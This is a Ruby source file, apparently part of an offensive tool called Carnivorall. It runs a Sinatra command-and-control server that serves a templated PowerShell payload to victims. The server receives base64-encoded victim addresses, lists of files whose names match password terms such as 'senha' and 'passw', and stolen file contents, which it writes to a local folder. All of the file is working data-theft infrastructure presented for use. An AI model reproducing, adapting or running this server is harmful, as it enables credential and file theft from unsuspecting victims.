#!/usr/bin/env ruby
#=========================================================================
# Title           :cec.rb
# Description     :Carnivorall module to send and receive victms requests
# Authors         :L0stControl
# Date            :2018/04/12
# Version         :0.0.1    
# Dependecies     :ruby gems - colorize / sinatra / ipaddr
#=========================================================================

require 'sinatra'
require 'colorize'
require 'ipaddr'

lhost = ARGV[0]
file  = ARGV[1]
match = ARGV[2]
dstFolder = ARGV[3]
lport = ARGV[4]

banner = "\n Usage: LPORT=80 LHOST=192.168.1.1 FILE=/path/to/powershell.ps1 ./cec.rb"

set :dump_errors, false
set :raise_errors, false
set :logging, false
set :environment, :production
set :show_exceptions, false

if lhost != nil
    if (IPAddr.new(lhost) rescue nil).nil?
        puts banner
        puts " [Error] Invalid IP address format #{lhost}".red
        exit
    end
else
    puts " [Error] LHOST parameter is empty".red
    exit
end

set :bind, lhost

if lport != nil
    set :port, lport
else
    lport = "80"
    set :port, lport
end

if match == nil
    match = 'senha" -or $_.Name -match "passw'
else
    match = match.gsub(" ",'" -or $_.Name -match "')
end

if file == nil
    puts "[Error] File not found".red
    exit
else 
    begin 
        scriptFile = File.open(file, "r")
        payload = scriptFile.read.gsub!("LHOST",lhost).gsub!("LPORT",lport).gsub!("MATCH",match)
        scriptFile.close
    rescue 
    puts "[Error] File #{file} not found".red
    exit
    end
end

def saveFile(content, name, directory)
    FileUtils.mkdir_p("#{directory}#{File.dirname(name)}") unless File.exists?("#{directory}#{File.dirname(name)}")
    out_file = File.new("#{directory}#{name}", "w")
    out_file.puts(content)
    out_file.close
    puts " [+]".green + " File #{name} saved on #{directory} folder" + "[ OK ]".green
end

get "/:ps.ps1" do
    "#{payload}"
end

post "/:content" do 
    resultFind = params[:filecontent].unpack('m*')[0]
    ipVictm = params[:ip].unpack('m*')[0]

    puts " \n#{ipVictm.gsub(/\s/, '').gsub(/\{/,"\n ").gsub(/}/, '')}".green
    puts " [+] List of files ".yellow
    resultFind.split(",").each do |lines|
       if lines.match(/File: /)
        puts " [+] ".green + "#{lines.split("\n")[0].split(" ")[1]}".white
       end
    end
    puts " [+] ----------------------------------------------------------------------------------- \n".yellow
end

post "/:send" do 
    fileName = params[:name].unpack('m*')[0]
    fileContent = params[:content].unpack('m*')[0]
    if dstFolder.empty?
        dstFolder = "/tmp"
    end
    
    if !fileName.empty? && !fileContent.empty?
        saveFile(fileContent, fileName, dstFolder)
    end

    puts "#{fileName}\n#{fileContent}" 
    puts " [+] ----------------------------------------------------------------------------------- \n".yellow
end
